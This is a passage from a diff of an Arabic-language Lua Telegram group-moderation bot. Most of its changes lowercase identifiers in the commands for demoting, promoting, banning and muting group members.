-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنزيله من ↓\n❅∫ { "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n❅∫ رتبته الان { عضو فقط }\n", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنزيله من ↓\n❅∫ { "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n❅∫ رتبته الان { عضو فقط }\n", 1, 'md')
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫  يتم رفعه باي رتبه سابقا ، \n", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫  يتم رفعه باي رتبه سابقا ، \n", 1, 'md')
 end 
 if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
-FLASHdx1:srem(FLASH..'bot:admins:', result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:onall:', result.sender_user_id_) 
-FLASHdx1:srem(FLASH..'bot:moall:', result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:vpall:', result.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:srem(flash..'bot:admins:', result.sender_user_id_) flashdx1:srem(flash..'bot:onall:', result.sender_user_id_) 
+flashdx1:srem(flash..'bot:moall:', result.sender_user_id_) flashdx1:srem(flash..'bot:vpall:', result.sender_user_id_)
+flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,result.sender_user_id_) flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_) flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
-FLASHdx1:srem(FLASH..'bot:onall:', result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:moall:', result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:vpall:', result.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) 
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_)  FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
-FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
+flashdx1:srem(flash..'bot:onall:', result.sender_user_id_) flashdx1:srem(flash..'bot:moall:', result.sender_user_id_) flashdx1:srem(flash..'bot:vpall:', result.sender_user_id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) 
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_)  flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
+flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_) flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end 
---     By Developer FLASH     -- 
-if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
 function remm(extra, result, success)
 if result.id_ then
 if is_leaderid(result.id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
 return false 
 end
-if FLASHdx1:sismember(FLASH..'bot:admins:',result.id_) then
+if flashdx1:sismember(flash..'bot:admins:',result.id_) then
 sudo3 = 'مطور ثالث ، ' else sudo3 = '' end
-if FLASHdx1:sismember(FLASH..'bot:onall:',result.id_) then
+if flashdx1:sismember(flash..'bot:onall:',result.id_) then
 onall = 'مدير عام ، ' else onall = '' end
-if FLASHdx1:sismember(FLASH..'bot:moall:',result.id_) then
+if flashdx1:sismember(flash..'bot:moall:',result.id_) then
 moall = 'ادمن عام ، ' else moall = '' end
-if FLASHdx1:sismember(FLASH..'bot:vpall:',result.id_) then
+if flashdx1:sismember(flash..'bot:vpall:',result.id_) then
 vpall = 'مميز عام ، ' else vpall = '' end
-if FLASHdx1:sismember(FLASH..'bot:monsh:'..msg.chat_id_, result.id_) then
+if flashdx1:sismember(flash..'bot:monsh:'..msg.chat_id_, result.id_) then
 monsh = 'منشئ اساسي ،  ' else monsh = '' end
-if FLASHdx1:sismember(FLASH..'bot:monsh2:'..msg.chat_id_, result.id_) then
+if flashdx1:sismember(flash..'bot:monsh2:'..msg.chat_id_, result.id_) then
 monsh2 = 'منشئ ، ' else monsh2 = '' end 
-if FLASHdx1:sismember(FLASH..'bot:owners:'..msg.chat_id_, result.id_) then
+if flashdx1:sismember(flash..'bot:owners:'..msg.chat_id_, result.id_) then
 owner = 'مدير ، ' else owner = '' end
-if FLASHdx1:sismember(FLASH..'bot:momod:'..msg.chat_id_, result.id_) then
+if flashdx1:sismember(flash..'bot:momod:'..msg.chat_id_, result.id_) then
 momod = 'ادمن ، ' else momod = '' end
-if FLASHdx1:sismember(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_) then
+if flashdx1:sismember(flash..'bot:vipmem:'..msg.chat_id_, result.id_) then
 vipmem = 'مميز' else vipmem = ''
 end
 if dxdx(result.id_,msg.chat_id_) ~= false then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنزيله من ↓\n❅∫ { "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n❅∫ رتبته الان { عضو فقط }\n", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنزيله من ↓\n❅∫ { "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n❅∫ رتبته الان { عضو فقط }\n", 1, 'md')
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫  يتم رفعه باي رتبه سابقا ، \n", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫  يتم رفعه باي رتبه سابقا ، \n", 1, 'md')
 end 
 if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
-FLASHdx1:srem(FLASH..'bot:admins:', result.id_) FLASHdx1:srem(FLASH..'bot:onall:', result.id_)
-FLASHdx1:srem(FLASH..'bot:moall:', result.id_) FLASHdx1:srem(FLASH..'bot:vpall:', result.id_)
-FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,result.id_) FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.id_)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.id_) FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.id_)
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:admins:', result.id_) flashdx1:srem(flash..'bot:onall:', result.id_)
+flashdx1:srem(flash..'bot:moall:', result.id_) flashdx1:srem(flash..'bot:vpall:', result.id_)
+flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,result.id_) flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.id_)
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.id_) flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
-FLASHdx1:srem(FLASH..'bot:onall:', result.id_) FLASHdx1:srem(FLASH..'bot:moall:', result.id_)
-FLASHdx1:srem(FLASH..'bot:vpall:', result.id_) FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.id_)
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_) FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.id_)
-FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.id_) FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,result.id_)
+flashdx1:srem(flash..'bot:onall:', result.id_) flashdx1:srem(flash..'bot:moall:', result.id_)
+flashdx1:srem(flash..'bot:vpall:', result.id_) flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.id_) flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.id_) flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,result.id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.id_) FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.id_) flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.id_)
 elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.id_) FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.id_) flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.id_)
 end
 Fsend = '❅∫ المعرف غير صحيح*'
 send(msg.chat_id_, msg.id_, 1, Fsend, 1, 'md')
 end end
 resolve_username(rem[2],remm)
 end 
---     By Developer FLASH     -- 
-if text:match("^رفع ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^رفع ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and flash11(msg) then
 function promote_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *تم رفعه ( ادمن بالجروب ) *\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *تم رفعه ( ادمن بالجروب ) *\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
-if text:match("^تنزيل ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and FLASH11(msg) then
+if text:match("^تنزيل ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and flash11(msg) then
 function promote_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *ادمن الجروب* ( ['..FLASH_res..'] )\n❅∫ *تم تنزيله ( عضو ) *\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *ادمن الجروب* ( ['..flash_res..'] )\n❅∫ *تم تنزيله ( عضو ) *\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end 
-if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and FLASH11(msg) then
+if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and flash11(msg) then
 function promote_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم رفعه ( ادمن بالجروب بكل الصلاحيات )\n❅∫ صلاحياته الان \n❅∫ تغيير اسم المجموعه \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط \n❅∫ تثبيت الرسائل \n❅∫ اضافه مشرفين *', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم رفعه ( ادمن بالجروب بكل الصلاحيات )\n❅∫ صلاحياته الان \n❅∫ تغيير اسم المجموعه \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط \n❅∫ تثبيت الرسائل \n❅∫ اضافه مشرفين *', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
-if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and FLASH11(msg) then
+if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and flash11(msg) then
 function promote_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ 
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ 
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم الغاء ( خاصيه تغيير الاسم )\n❅∫ صلاحياته الان \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط \n❅∫ تثبيت الرسائل*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم الغاء ( خاصيه تغيير الاسم )\n❅∫ صلاحياته الان \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط \n❅∫ تثبيت الرسائل*', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
-if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and FLASH11(msg) then
+if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and flash11(msg) then
 function promote_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ 
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ 
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم الغاء ( خاصيه التثبيت )\n❅∫ صلاحياته الان \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط *', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم الغاء ( خاصيه التثبيت )\n❅∫ صلاحياته الان \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط *', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text:match("^[Dd]el$") or text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and FLASH11(msg) then
+if text:match("^[Dd]el$") or text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and flash11(msg) then
 local id = msg.id_
 local msgs = {[0] = id}
 delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
 delete_msg(msg.chat_id_,msgs)
 end
 if is_monsh(msg.sender_user_id_, msg.chat_id_) then
-if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") and FLASH11(msg) then
-FLASHdx1:del("FLASH:lock:ban"..bot_id..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تفعيل الحظر ، ', 1, 'md')
+if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") and flash11(msg) then
+flashdx1:del("flash:lock:ban"..bot_id..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تفعيل الحظر ، ', 1, 'md')
 end
-if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-FLASHdx1:set("FLASH:lock:ban"..bot_id..msg.chat_id_,"FLASH")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تعطيل الحظر ، ', 1, 'md')
+if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+flashdx1:set("flash:lock:ban"..bot_id..msg.chat_id_,"flash")
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تعطيل الحظر ، ', 1, 'md')
 end
-if text:match("^تفعيل الكتم$") and FLASH11(msg) or text:match("^تفعيل التقييد$") and FLASH11(msg) then
-FLASHdx1:del("FLASH:lock:banmu"..bot_id..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تفعيل الكتم ، ', 1, 'md')
+if text:match("^تفعيل الكتم$") and flash11(msg) or text:match("^تفعيل التقييد$") and flash11(msg) then
+flashdx1:del("flash:lock:banmu"..bot_id..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تفعيل الكتم ، ', 1, 'md')
 end
-if text:match("^تعطيل الكتم$") and FLASH11(msg) or text:match("^تعطيل التقييد$") and FLASH11(msg) then
-FLASHdx1:set("FLASH:lock:banmu"..bot_id..msg.chat_id_,"FLASH")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تعطيل الكتم ، ', 1, 'md')
+if text:match("^تعطيل الكتم$") and flash11(msg) or text:match("^تعطيل التقييد$") and flash11(msg) then
+flashdx1:set("flash:lock:banmu"..bot_id..msg.chat_id_,"flash")
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  تم تعطيل الكتم ، ', 1, 'md')
 end end 
---     By Developer FLASH     -- 
-if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 function ban_by_reply(extra, result, success)
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:ban"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:ban"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
+return "flash"
 end
-local FLASH = 'bot:banned:'..msg.chat_id_
+local flash = 'bot:banned:'..msg.chat_id_
 if is_momod(result.sender_user_id_, result.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع حظر ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع حظر ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
-if FLASHdx1:sismember(FLASH..FLASH, result.sender_user_id_) then
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم حظره سابقا𓍢\n")
+if flashdx1:sismember(flash..flash, result.sender_user_id_) then
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم حظره سابقا𓍢\n")
 chat_kick(result.chat_id_, result.sender_user_id_)
 else
-FLASHdx1:sadd(FLASH..FLASH, result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم حظره بنجاح𓍢\n")
+flashdx1:sadd(flash..flash, result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم حظره بنجاح𓍢\n")
 chat_kick(result.chat_id_, result.sender_user_id_)
 end end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
 end  
---     By Developer FLASH     -- 
-if text:match('^حظر @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local FLASH_res = {string.match(text, '^(حظر) @(.*)$')}
+--     By Developer flash     -- 
+if text:match('^حظر @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local flash_res = {string.match(text, '^(حظر) @(.*)$')}
 function ban_by_username(extra, result, success)
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:ban"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:ban"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
+return "flash"
 end
-local FLASH = 'bot:banned:'..msg.chat_id_
+local flash = 'bot:banned:'..msg.chat_id_
 if result.id_ then 
 if is_momod(result.id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع حظر ، '..FLASH_renk(result.id_, msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع حظر ، '..flash_renk(result.id_, msg.chat_id_), 1, 'md')
 else
-if FLASHdx1:sismember(FLASH..FLASH, result.id_) then
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم حظره سابقا𓍢\n")
+if flashdx1:sismember(flash..flash, result.id_) then
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم حظره سابقا𓍢\n")
 else
-FLASHdx1:sadd(FLASH..FLASH, result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم حظره بنجاح𓍢\n")
+flashdx1:sadd(flash..flash, result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم حظره بنجاح𓍢\n")
 chat_kick(msg.chat_id_, result.id_)
 end end end end
-resolve_username(FLASH_res[2],ban_by_username)
+resolve_username(flash_res[2],ban_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(حظر) (%d+)$")}
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:ban"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
-return "FLASH"
